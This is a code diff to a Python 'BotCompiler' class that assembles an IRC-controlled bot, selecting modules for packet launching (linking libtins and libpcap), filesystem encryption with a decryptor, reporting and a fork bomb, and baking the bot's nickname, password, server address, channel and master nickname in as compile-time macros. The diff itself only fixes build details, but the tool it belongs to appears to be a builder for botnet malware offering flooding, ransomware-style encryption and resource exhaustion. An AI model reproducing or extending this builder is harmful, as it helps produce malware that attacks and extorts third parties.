@@ -68,6 +68,8 @@ class BotCompiler:
         self.objectFiles.append(PING_ACTION_OBJ)
         self.objectFiles.append(PACKET_LAUNCHER_OBJ)
         self.enableFlags["PING"] = ENABLE_PING_FLAG
+        self.dependencies.append(LIB_TINS)
+        self.dependencies.append(LIB_PCAP)
 
     def enableEncryptAction(self):
         self.objectFiles.append(ENCRYPT_ACTION_OBJ)
@@ -75,10 +77,10 @@ class BotCompiler:
         self.objectFiles.append(GEN_SCRIPT_OBJ)
         self.objectFiles.append(FS_DECRYPTOR_OBJ)
         self.enableFlags["ENCRYPT"] = ENABLE_ENCRYPT_FLAG
+        self.dependencies.append(CRYPTO_PP)
 
     def enableReportAction(self):
         self.objectFiles.append(REPORT_ACTION_OBJ)
-        self.objectFiles.append(CRYPTO_MANAGER_OBJ)
         self.enableFlags["REPORT"] = ENABLE_REPORT_FLAG
 
     def enableForkBombAction(self):
@@ -105,7 +107,7 @@ class BotCompiler:
         self.objectFiles.append(IRC_CLIENT_OBJ)
         self.objectFiles.append(MESSAGE_PARSER_OBJ)
         self.objectFiles.append(GENERAL_UTILS_OBJ)
-        self.dependencies.append("-lcryptopp")
+        self.dependencies.append(LIB_IRC_CLIENT)
 
         if "-NONE" in actions:
             print("Compiling bot with no actions")
@@ -138,12 +140,12 @@ class BotCompiler:
 
     def stringifyMacros(self):
         macros = ""
-        macros += f"-DBOT_NICK={self.botNick} "
-        macros += f"-DBOT_USER={self.botUser} "
-        macros += f"-DSERVER_ADDRESS={self.serverAddress} "
-        macros += f"-DASSIGNED_CHANNEL={self.assignedChannel} "
-        macros += f"-DBOT_PASS={self.botPass} "
-        macros += f"-DMASTER_NICK={self.masterNick} "
+        macros += f"-DBOT_NICK=\"{self.botNick}\" "
+        macros += f"-DBOT_USER=\"{self.botUser}\" "
+        macros += f"-DSERVER_ADDRESS=\"{self.serverAddress}\" "
+        macros += f"-DASSIGNED_CHANNEL=\"{self.assignedChannel}\" "
+        macros += f"-DBOT_PASS=\"{self.botPass}\" "
+        macros += f"-DMASTER_NICK=\"{self.masterNick}\" "
 
         return macros
     
@@ -207,7 +209,7 @@ class BotCompiler:
     def stringifyObjects(self):
         result = ""
         for object in self.objectFiles:
-            result += object + " "
+            result += object + ".o "
         return result
     
     def stringifyDependencies(self):
@@ -231,10 +233,8 @@ class BotCompiler:
 
     def compile(self):
         for cmd in self.commands:
-            try:
-                subprocess.run(cmd)
-            except:
-                continue
+            cmdArgs = cmd.split()
+            subprocess.run(args=cmdArgs)
 
     def compilationSetup(self):
 
@@ -245,7 +245,6 @@ class BotCompiler:
 
         self.setObjectFiles()
         self.setCommands()
-
         self.compile()
     
     def clean(self):
